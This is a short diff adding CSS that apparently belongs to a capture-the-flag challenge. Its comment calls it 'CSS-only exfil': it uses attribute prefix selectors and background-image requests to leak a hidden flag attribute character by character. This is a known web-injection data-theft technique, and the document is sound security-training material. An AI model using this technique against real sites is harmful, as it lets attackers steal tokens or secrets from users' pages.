@@ -1,0 +1,6 @@
+/* CSS-only exfil: attribute selectors generate background requests encoding chars */
+#secret[data-flag^="F"] ~ #leak { background-image: url('./leak/F'); }
+#secret[data-flag^="FA"] ~ #leak { background-image: url('./leak/FA'); }
+#secret[data-flag^="FAL"] ~ #leak { background-image: url('./leak/FAL'); }
+#secret[data-flag^="FALC"] ~ #leak { background-image: url('./leak/FALC'); }
+/* ... players infer the rest and read the attribute directly via DOM */
